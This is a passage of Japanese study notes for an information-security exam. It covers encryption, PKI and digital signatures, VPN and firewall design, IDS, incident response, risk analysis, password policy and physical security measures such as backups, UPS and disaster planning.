+・パターンマッチスキャンでは、ウイルス固定のパターンとファイルを照合する
+ことでウイルスを検知する。そのため、ウイルスを検知するためのウイルス検索
+エンジンとウイルス固有のパターンを収めたウイルス定義ファイルが必要。
+・ヒューリスティックスキャンは、挙動不審なプログラムをウイルスと断定する
+スキャン方法。未知のウイルスを検出できる可能性がある。
+
+
+■0x04.) 暗号化
+
+・暗号化は盗聴防止。ただし、厳密には盗聴されても内容を知られないようにす
+るという意味。
+・公開鍵暗号化方式とデジィタル署名における、仕組みをしっかり把握すること。
+・公開鍵暗号化方式と秘密鍵暗号化方式における、鍵の総数も知っておく。原理
+を知っておけば、簡単に導ける。
+・公開鍵暗号化方式は秘密鍵暗号化システムより、暗号化と復号化が複雑なので、
+処理に時間がかかる。
+・データ通信やファイルに対して暗号化ができる。
+・ハードウェアやソフトウェアの両方からのアプローチで、システムに暗号化を
+実装できる。
+・暗号化だけでは不足で、アクセス権を設定する必要なこともある。その理由は、
+データの改ざんや破壊を防止するためである。
+　暗号化はあくまで内容を読み取れるのを防ぐだけで、アクセス権がきちんと設
+定されていないと、勝手にデータを消去されることがある。
+・メールの暗号化といったらS/MIMEかPGP（ファイルの暗号かも可能だが）。試験
+ではS/MIMEが頻出。
+・固定式パスワードより、ワンタイムパスワードの方が好ましい。しかし、ワン
+タイムパスワードは費用がかさむ。
+・Windows XP ProおよびWindows Server 2003には、EFS（Encrypting File Syst
+em）というファイルの暗号化機能が備わっている。
+・KPS（Key Pre-distribution System）とは、データの暗号化を行う際に必要な
+鍵を安全に配送する方式のひとつである。
+
+●PKI
+
+・公開鍵証明書は印鑑証明書のようなもの。
+・対象者名の項目をユニークにする。
+　例えば、「所属＋氏名」とかにすると同じ所属に同姓同名がいた場合困る。ま
+た、別の所属（人事異動）になったとき、変更する必要が生じ面倒。
+・公開鍵証明書でクライアント認証できる。
+・公開鍵証明書を含むノートPCを紛失したら、すぐにその公開鍵証明書を失効さ
+せる。もちろん失効前にノートPCを紛失した人物を、きちんと本人確認を取る。
+　そして、新しい鍵ペアを生成し、公開鍵証明書の申請を促す。
+・申請を促すには、「初期パスワード」（システムによって異なるが、これが一
+般的）と「パスワードの有効期限」を記載したメールを送る。
+　証明書申請され、その発行が終わったら、申請者に対して「証明書発行通知」
+と「受領確認の返信依頼」をする。
+・クライアント認証は認証時点で証明書が有効であればよい。しかし、ディジタ
+ル署名を利用しているなら署名時点に遡って有効でなければ、署名を確認できな
+い。
+　よって、ディジタル署名の場合は、早い時期から証明書の更新を促すようにす
+る。その開始時期は、ディジタル署名したデータの保存期間を考慮して決定する。
+・XKMSは、XML鍵管理サービス。ディジタル署名に使われる鍵情報を効率よく管理
+するためのWebサービスプロトコル。
+
+●ディジタル署名（電子署名）
+
+・電子商取引では、なりすまし、盗聴、改ざん、取引事実の否認（これ結構重要）
+などの脅威がある。このような脅威を回避するために、取引先が正当であること
+を証明する方法が必要である。このための仕組みがディジタル署名である。
+・主になりすまし検出（防ぐことはできない）。「なりすまし」「正当性」など
+の単語を見たら、ピンと来るように。
+・CA（認証局）が発行する鍵の正当性を証明するのが、ディジタル証明書（電子
+証明書）。
+・ディジタル証明書の有効期限は重要。運用上注意すべき点として、証明内容を
+定期的に確認すること。
+・ディジタル署名は署名されたデータの所有者の正当性、クライアント認証は公
+開鍵そのものの正当性を確認するものである。
+・ディジタル証明のディジタル証明書を利用したシステムの運用では、有効期限
+をチェックしなければならない。有効期限が過ぎていれば証明書は無効として扱
+う。
+　そして、有効期限が過ぎていなければ、次に有効性を発行元に常時確認するこ
+と。
+・ディジタル証明書は相手の正当性を証明するだけであり、事業内容を保証する
+わけではない。
+・X.509はITU-T（国際電気通信連合電気通信標準化部門）が定めたディジタル証
+明書の標準仕様。多くの場合、X.509 v3（ディジタル証明書）、X.509 CRL（ディ
+ジタル証明書失効リスト）などがある。
+・リバースProxyを使ったシングルサインオンでは、ユーザー認証においてパスワ
+ードの代わりにディジタル証明書を用いることできる。
+
+●メッセージダイジェスト
+
+・改ざん防止
+・ハッシュ関数でメッセージダイジェスト（＝ハッシュ関数値）を作る。
+
+●SSL
+
+・WWWクライアント（ブラウザ）とWWWサーバー間における暗号化プロトコル。
+・公開鍵暗号化方式と秘密鍵暗号化方式を組み合わせて実現する。というのもデ
+ィジタル証明書を発行するから、ディジタル署名の仕組みを理解すればよい。
+・SSLで使用する個人認証用のディジタル証明書は、ICカードやUSBデバイスに格
+納できる。
+
+
+■0x05.) ネットワーク関連
+
+●RAS（Remote Access Service）
+
+・電話回線やISDN回線を通じて遠隔地のコンピュータにダイヤルアップ接続して、
+アクセスできるサービス。
+・RASを使った通信は普通社外から、ノートPCを通じて行われることが多い。つま
+り、そのノートPCを紛失すると、RASの接続電話番号がばれ、下手すると不正アク
+セスされる。そのため、パスワードは記憶させてはいけないし、PC内にパスワー
+ドを保存してはならない。もちろん安易なパスワードもダメ。RAS接続だと業務の
+サーバーなどに直接アクセスできることも多く（内部ネットワークに直結が多い）、
+一旦侵入されるとインターネット越しからのアタックより怖い。
+・認証サーバーを設置してRASへの接続時にパスワードのチェックを行う。
+・RASと社内ネットワークとの間には、ファイアウォールを設置した方がよい。
+
+●VPN（仮想私設網）
+
+・離れた2つのネットワークを暗号化通信を利用して繋ぎ、専用線と同じ効果が得
+られる技術。
+・VPNのプロトコルの代表的なものとしてIPsecがある。他にはPPTP（MSが開発し
+たWinNTサーバー用に実装した、PPP認証を拡張したVPNプロトコル）、L2TP（L2F
+とPPTPを統合したプロトコル）などがある。
+・IPsecのカプセル化には、トランスポートモードとトンネルモードがある。
+　前者はTCP/UDPのヘッダとデータをカプセル化する。一方、後者はIPヘッダとデ
+ータをカプセル化し、新たなIPsec対応のIPヘッダを付与して転送する。
+・IPsecの基本プロトコルは、認証ヘッダ（AH）プロトコル、暗号ペイロード（E
+SP）プロトコル、IKE（自動鍵交換）プロトコルの3つで構成されている。
+・IPv6の標準仕様としてIPsecの機能が組み込まれているが、無設定の状態では暗
+号化は行われない。
+
+●DNS
+
+・DNSへの問合せの際に、毎回上位のDNSサーバーにアクセスするとネットワーク
+が輻輳【ふくそう】してしまう。そのため、DNSサーバーは一度アクセスするとI
+Pアドレスを保存する。これをキャッシングという。
+・キャッシングされたIPアドレスは一定期間を過ぎると消去される。なぜなら、
+WebサーバーのIPアドレスが変更されたり消滅されたりする可能性があり、最新状
+態にする必要があるから。
+
+
+■0x06.) ネットワーク機器
+
+●ルーター
+
+・IPアドレス変換によって、LANからインターネットへのアクセスはすべてルータ
+ーのグローバルIPアドレスからのアクセスになる。
+
+●IDS
+
+・侵入検知システム＝IDS。「侵入検知」という単語はすぐ出るように覚える。
+・IDSはウイルス対策ソフトにおけるパターンファイルのように、あらかじめデー
+タベースに登録されたシグニチャと呼ばれる不正侵入のパターンと、ネットワー
+ク上を流れるパケットのパターンを分析・照合し、マッチングしたら不正侵入と
+みなし、管理者に通知するシステムである。
+・ホストベースIDS、ネットワークベースIDSの区別ができるようにする。
+　ホストベースはサーバーにインストールするソフトウェアという形で提供され、
+ネットワークベースはネットワークの境界などに設置する専用の機器として提供
+される。つまり、ネットワークベースIDSを導入するなら、ハードウェアを追加す
+る必要があるということだ。
+・IDSには最新のシグニチャが提供されるまでの間は無防備になるという問題点が
+ある。そこで登場したのがIPS（Intrusion Prevetion System）である。これはシ
+グニチャ検知に加えて、シグニチャが存在しない場合トラフィックを基準データ
+と比較して異常行動かを判断して、攻撃を検知するアノマリ検知やDoSアタック検
+知など、検知精度をさらに高めるために新しい検知機能追加導入されている。
+・複数のログで差異をチェックするためには、それぞれのホストの時間を完全に
+同期させなければならない。
+
+●ファイアウォール
+・ファイアウォールはProxy機能を実装できる。しかし、それぞれを別サーバーに
+したほうがよい。
+・パケットフィルタリングでセキュリティを高める。
+・DMZを設置できる。
+・外部向けWebサーバーはDMZにおく。DBをそれと連動させたい場合は、DMZより内
+側の内部ネットワークにDBサーバーを置くのがベスト。
+・DMZ内には一般的にWebサーバー、メールサーバー（外部へのメールはここを通
+過）などがある。
+　最悪、これらが侵入されても、DMZから内部ネットワークへの侵入を防ぐことが
+できる。これがDMZの本質。
+・IPアドレス変換機能、NAT、IPフォワーディング、IPマスカレードという言葉を
+知っておく。
+・ルールベース（原則拒否の方針）によって、通信を禁止する。
+・ネットワーク上でファイアウォールによって区切られた各部分のうち、もっと
+も外側のインターネットに近いセグメントをバリアセグメントという。場合によ
+っては、DMZとバリアセグメントがかぶることもある。
+・URLフィルタリング（≒コンテンツフィルタリング）する際には、画一的に行わ
+ずに発信者IPアドレスによって個別にURLアクセス先を制御したり、申請を簡素化、
+変更・処理の迅速化、設定の見直しが必要。
+・アプリケーションレベルゲートウェイは、通信を中継するProxyプログラムを使
+い、イントラネットとインターネットを切り離す方式。
+　Proxyサーバー上で、アプリケーションレベルのフィルタリングを行い、データ
+を中継する。
+・バーチャルサーキット（仮想回路）は、物理的な回線を論理的な複数の回線と
+して分割した仮想回線の1本1本に論理的なチャネル番号をつけたものである。
+　バーチャルサーキットでサーバーとクライアント間を結ぶタイプのサービスが
+サーキットレベルゲートウェイである。トランスポート層でサービスを中継する。
+
+●サーバー
+
+・最新のセキュリティパッチ（修正パッチ）を施し、セキュリティホールをなく
+す。
+・不必要なサービスを停止しておく。
+・可能ならWebサーバーやメールサーバーには、ウイルス対策ソフトを導入してお
+く。
+・ログをネットワーク越しにリアルタイムに保存するログサーバーを用意すると
+よい。その際、きちんと全サーバーの時刻を同期させておかなければならない。
+・集中管理され、大量のデータを持つDBサーバーの代替手段は普通ありえない。
+
+
+■0x07.) アタック
+
+・アタックの痕跡が見つかったら、ネットワークから切り離した上で、現状のHD
+Dの内容をテープなどに保存する。これは証拠や痕跡を完全に残し、不正侵入によ
+る被害状況を調査・分析するためである。
+・データの破壊されても大丈夫なように、バックアップは定期的に取る。そして、
+破壊されてしまったら、バックアップデータからリストア（復旧）する。緊急用
+ディスク（救済用ディスク）も完備しておけばベスト。
+
+●ソーシャルエンジニアリング
+
+・電話越しのソーシャルエンジニアリング対策としては、本人確認をしっかりす
+ることである。例えば、コールバック、その声を知る人物に確認してもらう、本
+人の携帯電話に電話するなど複合的に本人確認を取る。
+・ATM操作、パスワード入力時はショルダーハッキングに気を付けること。モニタ
+ーの角に貼り付けることができるショルダーハッキング対策の鏡も存在する。th
+ink geekに売っているはず。
+
+●なりすまし
+
+・なりすまし防止には、パスワード認証、ディジタル署名、ディジタル証明書に
+よる認証、バイオメトリクス認証、携帯電話などの発信者番号通知が有効。
+
+●セキュリティ修正パッチ
+
+・修正パッチを適応した後は、不具合が生じないかデバッグを行う。そのため、
+デバッグ作業で時間は少々かかる。この時間を短縮させるには、緊急性と重要性
+の高いパッチを取捨選択する。
+・パッチ適用後の影響の範囲を調査すると時間がかかる。
+　そのため適用回数を少なくするために、不具合の緊急性を判断し、緊急性の高
+いものに対して、優先的に対処する（外部サービスを利用するときも同じ）。
+
+●アタック後の対応
+
+・セキュリティ事故を発見したとき、情報セキュリティ管理者（または上司）に
+迅速に報告し、指示を仰ぐ。これは人的セキュリティであることを理解しておこ
+う。
+　決して、自分で対処（セキュリティ対策や勝手に些細な問題だから放置といっ
+た対処）してはならない。もし、自分で対処してしまうと、事故発生状況の記録
+を残すことを怠りがちである。これにより、事故の原因を追求できないという問
+題が起こる。
+・特にウイルスへの対処の場合、経験のない社員が原因の除去を行おうとすると、
+ウイルス調査や報告などのためにメールを利用して他人にウイルスを感染させて
+しまうことがあったり、ウイルスを削除しようとしてシステムに必要・大事なフ
+ァイルを誤って消去してしまうことがある。
+・情報セキュリティ管理者は、アタック後のディスクの内容をテープに保存する。
+これは、ディスクの改ざんや破壊の証拠などの現状の状態を残すためである。こ
+れは犯人追跡・逮捕に重要である。
+・不正アクセスを受けたサーバーのみの対処では不十分で、他のすべてのサーバ
+ーの設定ファイルの内容や修正パッチの適用状況を調査し、それぞれの状態に応
+じて適切な処置を施す。
+・アタックの調査内容として、不審なアクセスの記録の検出、ユーザーのログイ
+ンの状況の把握、プロセスの稼働状況の確認などがある。
+・セキュリティ事件が起こった課長にはそれ相応の責任がある。例えば、事件発
+生時に何も指示せず他のメンバーに状況調査や対処を任せたことは問題である。
+あらかじめ対応手順を策定しておき、それに則って対処させるべきである。
+・事件再発時に再発防止対策実施などのためにサーバー（特にWebサーバーなど、
+業務サーバー、DBサーバー）を長時間停止させてはならない。すぐにサーバーを
+復旧させ、その後再発防止策を実施させるべきである。
+
+●アタックからの復旧のための費用
+
+・改ざんや破壊に対して復旧している間のシステム停止による機会損失がある。
+・受注前情報の改ざん・破壊が原因で失注した場合の損失がある。
+・ノートPCを紛失した場合、新しいノートPCの購入、インストールするソフトウ
+ェアの購入が新たに必要。
+
+
+■0x08.) リスク分析
+
+・リスクの発見・確認とリスクがもたらす大きさ（損失）を算出することをリス
+ク分析という。
+・定量化するときは、上司の指示が現在のリスク分析なのか、それとも将来のリ
+スク分析なのかをはっきり把握しておく。
+
+●チェックリスト、アンケート
+
+・多数の人間から同じ内容を調査する場合は、一人一人ヒアリングをするより、
+チェックリストを用いた調査の方が効率がよい。
+・利用者の回答内容を均一化できる。
+・調査後の集計が比較的容易になる。
+・利用者の記入・回答の負担が少ない。
+・調査項目の体系化が可能である。
+・あらかじめリスト化することで調査漏れがなくなる。
+・調査データが多いときに便利。
+・回収率が高い。回収率が高ければ、最終的なデータは多くなる。
+・調査対象者が外出の多い営業部員であることや、ノートPCの使用は脆弱性が大
+きいため、チェック項目が多いことを考慮して、チェックリストを用いるとよい。
+
+●レビュー（ドキュメントレビュー）
+
+・特定の情報を調査するために関連する書類（設計書や仕様書など）を点検する
+こと。
+
+●ヒアリング調査（インタビュー調査、聞き取り調査）
+
+・担当者から情報を収集すること。
+・レビューと併用されることが多い。
+
+●現場調査（現地調査、現状調査）
+
+・店舗や工場における機器の使用状況や設置場所などを調べるために行われる調
+査。
+
+●リスク分析の対象
+
+・すべてのリスクに対応することは時間と費用がかかるために、損失額と発生確
+率を予想してリスクの大きさの順に優先順位をつける。頻度は低いが金額が大き
+いものは、経営者が意思決定を行う。ここで、対策費用についてもリスク分析の
+対象となる点に注意が必要である。
+・好ましくない事象を、単独で発生確率の得られる段階まで展開していく方法を
+フォールトツリー分析法（FTA：Fault Tree Analysis：故障の木解析）という。
+
+
+■0x09.) テスト
+
+・本格導入の前に、パイロット試験でインターネット接続試験をして結果がOKだ
+ったら、一度再インストールしてから本格導入に移行する。なぜなら、インター
+ネット接続試験中に、PCやサーバーに不正なプログラム（Wormなど）が組み込ま
+れる可能性がある。
+・総合試験の段階では、ペネトレーションテスト（擬似侵入攻撃テスト）を実施
+し、実際に大量のログ情報の分析や対処の仕方についてテストしておく。これを
+しておけば、本格導入した後、ログが大量すぎて対応できないという問題は起こ
+らない。
+
+
+■0x0A.) パスワード
+
+・IDとパスワードが盗難されると社外から不正アクセスされる。
+・パスワードを他人に教えない、共用しない。当たり前のことだが、試験時には
+結構忘れがち。
+　共用してしまうと、情報へのアクセス者を特定できないこと（問題発生時、責
+任を追求できない）、個人ごとのアクセス制御ができないこと（一番アクセス権
+が高いパスワードを全員で利用してしまうことになる）、個人ごとのアクセス履
+歴が取れないこと（ログの分析がうまくいかなくなる）、パスワードの変更が難
+しいこと（パスワードを変更した場合、他の共有者への連絡などが面倒になり、
+つい紙に書いてPCに貼っておくという好ましくない状況になりがち）などがある。
+・パスワードを定期的に変更する。
+　ただし、これはユーザーの負担になる。つまり、怠るユーザーが生じる可能性
+が高いわけだ。
+・安易なパスワードはつけない。
+・パスワードのメモはモニターにはりつけたり、わかりやすい場所に置かない。
+記憶するのがベスト。メモする場合は、施錠する場所に保管する。
+・同じパスワードを別の認証に使いまわさない。ひとつのパスワードがばれてし
+まうと、あらゆる認証を突破されてしまうため。
+・ワンタイムパスワード（使い捨てパスワード）や時限パスワードは、固定式パ
+スワードよりセキュリティが高い。
+　ちなみに、ワンタイムパスワードは毎回異なるパスワードを使い、時限パスワ
+ードは定期的にパスワードの変更を自動的に促してくれる。
+・ワンタイムパスワードは仮に盗聴されても、一回限りの使用なので、問題ない。
+・ネットワーク管理者のアカウントは共有のものではなく、個別単位で運用する
+こと。
+　そうしないと、管理者のうち誰がログインしているのか確認できず、その状態
+で何か問題があったとき責任の所在がわからなくなってしまう。
+・一人の社員のパスワードが漏れていることが判明したら、他の社員のパスワー
+ドも漏れている可能性がある。
+・初期パスワードを発行したら、すぐにパスワードを変更させるように促す。
+　その初期パスワードが証明書発行の認証用ならば、発行後サーバーの方から本
+人確認のために発行手続き完了通知のメールを送信させる。
+・ログだけからは、アカウントの正当な所有者のログインと、なりすましのログ
+インを区別できない。つまり、ログの監視によって直接なりすましを検知するの
+は困難ということだ。
+　しかし、手がないわけではない。普段ログインする時間帯や利用する機器のIP
+アドレスなど、通常時のログイン・ログアウトのパターンを把握しておいて、そ
+のパターンから見て異常があれば、怪しいと推測することが可能。
+
+●認証
+
+・RADIUSは、ダイヤルアップ接続におけるユーザー認証のひとつ。
+　アクセスしたユーザーの情報（ユーザー名、IPアドレスなど）を記録・管理す
+る。IDSのように侵入検知の仕組みはない。
+・シングルサインオンにはクッキーを使う方法とリバースProxy（ユーザー認証の
+代理を行う）を使う方法の2つがある。
+・SAML（Security Assertion Markup Language）は、企業間のWebサービスのシン
+グルサインオン（SSO）を実現するときに用いられるWebサービス技術。
+　認証情報に加え、属性情報とアクセス制御情報を異なるドメインに伝達する。
+従来のクッキーを利用したシングルサインオンで問題となっていた認証が行われ
+る範囲の制限を解消し、セキュリティ検査を強力にする目的で開発された。
+　プッシュモデルとプルモデルがある。前者はユーザーがソースWebサイトに対し
+て事前に認証情報を目的Webサイトに送信しておくように要求を出すモデル、後者
+はユーザーが目的Webサイトにアクセスしたときに目的Webサイトが認証情報をソ
+ースWebサイトに問い合わせるモデル。
+・不正アクセスに対してはユーザーIDを限定することによるアクセス制御、アカ
+ウントロック機能、ジャーナルの記録機能が有効。
+・ネットワーク管理者と情報セキュリティ管理者のID付与権限を明確にわけたほ
+うがよい。
+　なぜなら、職務を分離することで、相互牽制機能を持たせることができる。ま
+た、組織全体に適用することと、全社員への周知徹底を図ることができる。
+
+●機密ランク
+
+・情報の機密度によって、ランク付けする。
+・ランク付けによって取り扱い方は大きく変わる。それは電子データだけでなく、
+文書などもそうである。
+・機密ランクが最高の電子データは、PCで使用した後、PC終了時にはPC内に一時
+ファイルを残さないという徹底をするのが理想。
+・機密ランクが最高の文書は、プリンタ出力から廃棄まできちんと管理する。
+
+
+■0x0B.) 物理セキュリティ
+
+・復旧手順書を整備し、被害発生時の作業手順を定めておく。
+
+●バックアップ
+
+・地震・火災対策としては、専用サーバーの代替機を外部に設置して、データの
+バックアップを外部に定期的に保管する。ここまで万全なら、何かトラブルが起
+こっても、業務の根幹を停止する時間を最小限に食い止めることができる。
+・代替機にはOSやソフトウェアをあらかじめインストールしておき、さらに動作
+確認をして、その状態を維持しておく。
+・紙の情報媒体はバックアップしづらい。そのためアンケートはWebアンケートの
+みに一元化したほうがよい。
+・バックアップ媒体には必ずラベリングをする。ラベリングをしないと内容がわ
+からなくなってしまい、中身にあるファイルを実行しなければならなくなる。正
+体不明のファイルを不用意に実行することはセキュリティポリシーに反する。
+　ただし、「極秘」「秘密」といった記入は止めること。盗難や不正コピーの対
+象となりやすいからである。
+・バックアップ媒体は、3世代管理など段階を踏むのが理想。
+・バックアップ媒体は、安全に保管する。施錠可能なキャビネット内に保管。
+・バックアップ媒体は、対数年数などを考慮して、定期的に新品に交換する。
+・最新バックアップは既に問題発生後の状態のものである可能性もあり、問題点
+発生時刻とバックアップ時刻を比較し、問題点を含まないバックアップを使用し
+て復旧する。
+・バックアップデータの保管委託先として他社を利用したとする。そして、実際
+にそのバックアップを必要としたとき、そのデータを取り寄せる時間も計算に入
+れること。
+
+●ICカード
+
+・身分証、社員食堂の支払カードを兼ねることもある。しかし、そうすると使用
+機会が多くなり紛失の可能性が高くなる。
+　しかも、第3者に拾われてしまうと、簡単に不正使用される。特にICカードのチ
+ェックだけだと簡単に入室されてしまう。
+・よって、部屋の入室管理にICカードとテンキー入力の認証システムやバイオメ
+トリクス認証などの追加手段を用いるとよい。
+・機密度の高い部屋は電子錠だけだと、同じ暗証番号を共有することになるので、
+入室した人物の特定ができない。そこで、ICカードを併用することで、入室履歴
+を残すことができる。
+・社員番号を基に入室権限をチェックするということから、チェックは社員番号
+だけであろう。すると、社員番号の書き換えのような偽造が簡単。
+・ICカード導入により、無人化されるので本人確認ができない。
+・会社を辞めた人物のICカードは返却してもらい、さらにそのICカードで入室で
+きないように設定しておく。
+
+●ノートPC
+
+・ノートPCに関する問題は、貸し出されたものなのか、それとも個人所有のもの
+なのかを明確にして考えること。実際それが問題の根幹となっていることもある。
+・貸し出されたノートPCに勝手にソフトウェアをインストールしたり、設定を変
+更することを禁止する。ウイルス対策ソフトのアンインストールもそうである。
+・個人所有のノートPCを無断で社内LANに接続して使用することを禁止する。
+・ノートPCの紛失は、RASからの不正アクセス（対策として、RASのパスワードは
+しっかり管理する）、個人情報漏洩（対策として、重要なファイルは暗号化して
+おく）、公開鍵証明書の盗難（対策として、すぐにその証明書を失効する）とい
+うリスクに繋がる。
+・ノートPCがアタッカーの手に渡っても、容易にログインできないようにきちん
+とログインパスワードを設定する（実は、これを回避する手法は確立されている）。
+それでも一応、一定時間操作がなかった場合に、自動ログオフするように設定す
+る。
+・ノートPCを紛失したら、すぐに上司（そして上司からセキュリティ管理者に報
+告）またはセキュリティ管理者に報告する。
+・社内専用ノートPCは持ち出し禁止にする。このことに関する規則を制定して運
+用する。
+　退社時は、ノートPCの電源を落とし、施錠できる引出しに置く。同時に身の回
+りのもの（業務に使用するもの）も引出しに入れて、整理しておくこと。これは
+侵入者による盗難を防ぐためである。
+・盗難が発生した際の対処手順をマニュアル化しておき、迅速な対応をできるよ
+うにする。
+・社外で感染したウイルスが、社内に接続したとき感染が拡大することがある。
+これを防ぐには、社内LANに接続する前に必ずウイルスチェックをする。
+・盗難されたノートPCに個人情報のリストがあったなら、誰の情報、どんな情報
+が漏れたのかを調査する。
+・セキュリティケーブルや警告音を発する装置（ある半径以上を離れると音が発
+する）で盗難対策を行う。大学の端末室などでは、キーボード、モニターなどに
+もセキュリティケーブルが繋がっている。
+
+●端末の配置
+
+・コールセンターでは音声を遮蔽する必要から、オペレータをパーティションで
+囲い、ほぼ個室に近い状態にしている例がある。しかし、オペレータに対する監
+視の目が届かなくなるため、セキュリティの観点からはこのような配置はあまり
+望ましくない。
+・端末の配置には、パーティションで完全に仕切った個室型、机を向き合わせた
+航空母艦型、全員が同じ方向を向く教室型がある。監視可能性という観点からは、
+背面から監視できる教室型が望ましい。個人情報を取り扱う端末が、スーパーバ
+イザーなどの管理者から監視しやすいからである。
+　また、モニターカメラを設置して、就業状態を録画することもオペレータへの
+牽制の意味で非常に効果がある。
+
+●冗長化
+
+・連続運転を行うためによく用いられる手段。
+・部品を2つ用意しておいて、一方が壊れたら、もうひとつの部品を利用する方法
+である。
+　例えば、HDD、電源、冷却ファンなどが冗長化の対象となる。ハイエンドのサー
+バーの場合、メインボードやBIOS（BIOSの場合はユーザーユースのものでもデュ
+アルありますが）まで2重化されることがある。
+・複数台の現用系に加えて予備系を設置することは可用性の向上に繋がる。
+
+●ホットスワップ機能
+
+・電源を落とすことなく、部品の交換作業が行えること。
+
+●UPS（無停電電源装置）
+
+・情報システムに電力を供給する電源は、停電、瞬断、その他の電源異常から、
+保護して途切れさせないことが重要である。
+・配電経路の二重化、非常用電源として立ち上がりの早いガスタービン発電機を
+設置する。しかし、それらの非常用電源だけでは瞬断の恐れがある。
+・コンピュータにとって瞬断はシステムダウンに繋がる可能性があり、瞬断対策
+は重要である。「情報システム安全対策基準」にそのことが記載されている。
+・瞬断のリスクを避けるためには、UPSを設置する。
+　さらに、入力変動や出力負荷の変動に関係なく出力電圧と周波数を一定に保つ
+定電圧定周波数電源装置（CVCF）も併設すれば万全といえる。
+
+●空調設備
+
+・水冷式空調機の採用は好ましくない。なぜなら、断水時に運転できないこと、
+地震により給配水管が破損した場合に空調機自体運転ができないばかりか、漏水
+によってシステムに被害が及ぶ可能性があるからである。
+　「情報システム安全対策基準」には、「室内に、情報システムの運転に必要な
+水使用設備以外設置しない、水配管を通さない」、「水冷式コンピュータを設置
+する場合は、水漏れ防止の措置を講ずる」といった記述がある。要約すると、で
+きるだけ水を使わない方がよいということである。断水や漏水によってかえって
+可用性が低下したのでは意味がない。
+
+●防火対策と消化設備
+
+・建材や備品は、燃えないあるいは燃えにくい材質のものであることが必要。「
+情報システム安全対策基準」にそのことが記載されている。
+・消火設備のタイプとしては、窒素ガスなどによる不活性ガス消化設備がよい。
+水消化設備はもちろんのこと、泡消化設備も水分なので、使用してはいけない。
+
+●地震対策
+
+・被災時は、とかくあわただしく、混乱を招きやすい。JIS X 5080では緊急時の
+手続きおよび過程の文書化、さらに緊急時手順および過程についての職員の適切
+な教育が定められている。つまり、災害対策マニュアルを準備しておき、その内
+容を評価検証し、関係者に教育を行い、周知徹底させることが必要である。
+・網入りガラスは地震のときにガラスが飛び散らないためのものであり、防犯性
+はまったくない。
+　防犯がメインなら、あわせガラス（フィルムが間に入っている）を使うか、シ
+ャッターで覆い隠すか、鉄格子を補強する。
+・バックアップやシステムを2重化するには、遠隔地に置く。
+・実際に大地震などでシステムが停止した場合、停止したいつものシステムを復
+旧させるか、あるいはバックアップシステム（遠隔地にある）に移行してシステ
+ムを復旧させるのかをいずれかを選択することになる。システムが復旧するのは
+どちらが早いかでそれを決定する。
+・被災時用としての連絡手段を確保することは一般人にとって現実的ではない。
+ということは、被災時にも通常使用している連絡手順で連絡を取ることになる。
+その連絡手段としては、固定電話、携帯電話、携帯メール、インターネットメー
+ル、FAXなどが考えられる。ここで重要なのは、連絡手段は複数確保しておくこと
+である。特に、地震、津波などの大災害の場合、電話回線が切断されていたり、
+契約しているメールサーバーが停止したり、携帯電話が混雑して繋がらないなど
+の状況が考えられるからである。
+
+●代替部品の準備
+
+・部品が故障したときすぐに交換できるように同じ型番の部品を準備しておく。
+　コンピュータの世界では移り変わりが激しく、半年前のパーツでもすぐに入手
+困難になることが多いので、予備にたくさん買っておくとよいかもしれない。
+
+●クラスタリング
+
+・単体のサーバーでは部品の冗長化によって、可用性や信頼性をあげているが、
+サーバーのマシンごと冗長化してしまうという方法もある。このようにマシン単
+位での冗長化技術をクラスタリングと呼ぶ。
+・メインサーバーとバックアップサーバー同士は専用のバスやネットワークで接
+続しておく。常時サーバー同士が生命信号（ハートビート）を送信しあって、動
+作を確認しあう。また、動作中のデータを保存している。障害によって、ハート
+ビートが途絶えたとき、メインのサーバーが自動的にバックアップサーバーに処
+理を引き継ぐ（バックアップサーバーが主ノードとして処理するのをファイルオ
+ーバーと呼ぶ）。片方のサーバーが動かなくなっても、ユーザーからはサーバー
+に障害が起こっているということを知ることなく、普通に1台のサーバーが継続し
+て作業を行ってみえるわけだ。
+・メリットとして、ダウンタイムを短くして可用性を向上させること、並列処理
+によるパフォーマンスの向上が挙げられる。
+・デメリットとして、費用がかかること、2台のサーバー分の電源（UPSも2台あれ
+ば理想）を用意しなければならないことがある。
+
+●ネットワークの多重化
+
+・専用線がダウンしたときの備えのために、バックアップ回線としてxDSL回線を
+利用するのもよいだろう。そのため、WANルーターのマルチホーミング機能（2本
+以上の異なる回線を束ねる1本の太い回線に見せかける技術）を使って通常字から
+専用線とDSLを並列に接続して、多重化しておく。
+　これにより、接続の信頼性が高まり、さらに帯域の利用効率の向上も見込める。
+
+●プリンタ出力
+
+・情報資産のプリント出力は社外に持ち出しするのを禁止する。
+・機密レベルが高い文書を印刷する場合は、セキュリティ管理者が立ち会う。
+・印刷物を放置して盗難に合わないように、出力された帳票は所定の場所に保管し、
+利用方法を定めておく。さらに、保管場所から持ち出す場合には、管理台帳で管理
+すれば、責任の所在も明確になる。
+・管理台帳で印刷者、印刷した時刻、内容、利用目的、立会人のサインなどを記
+録する。さらに細かくいえば、出力ページ数、出力部数、使用パソコン、印刷し
+たファイル名などもある。
+・印刷物がいらなくなったら、セキュリティ管理者に返却し、セキュリティ管理
+者は完全に廃棄する。
+・リサイクルボックスにはいれない。どうしても使うなら機密事項レベルを設け
+て、使いわける。機密情報なら焼却or溶解、社外秘なら裁断、それ以外はリサイ
+クルボックス。
+・リサイクルボックスやゴミ箱には鍵を付ける。
+・むやみに個人情報を印刷したりコピーするのは避け、印刷したらプリンタから
+即座に印刷物を取り上げる。
+
+●鍵の管理
+
+・管理室で鍵を受渡しする際、社員側は社員証を提示し、管理台帳に日時や氏名
+を記入する。また、管理室の係員は社員証で本人確認し、記入内容確認後、確認
+の署名（係員の署名）をする。
+・ピッキングツールによる解錠、破錠に脆弱な錠は使わないこと。
+
+●PCを前にした席を外すとき
+
+・会議中、作業室などにおいて。
+・自動ログオフ機能（ログイン時にはもちろん認証あり）、パスワード付きスク
+リーンセーバー（これを適用することをクリアスクリーンポリシーという）、自
+動画面ロックを導入する。一番安全なのは自動ログオフ機能である。
+
+●ビルディングパーミッション（building permission）
+
+・建築許可を与える手続きのこと。
+・情報システムを更新したり、まったく新しいシステムを稼働させるに当たって、
+セキュリティという観点から評価し、問題がないことを条件にシステムの入れ替
+えや運用を許可する審査手続き。
+・対象とする情報システムを本番稼働させた場合に想定されるリスクについてあ
+らかじめ評価を行い、認識されるリスクに対する防護措置が取られているか、定
+められたセキュリティガイドラインと照らして必要十分なセキュリティ機能が盛
+り込まれているかを審査する。
+　一般に、情報システムの耐用期間、即ちシステムのライフサイクルは3年から5
+年といわれている。ビルディングパーミッションをすべての情報システムの改修
+時に適用することで、数年の後にはすべての情報システムがリスク評価の対象と
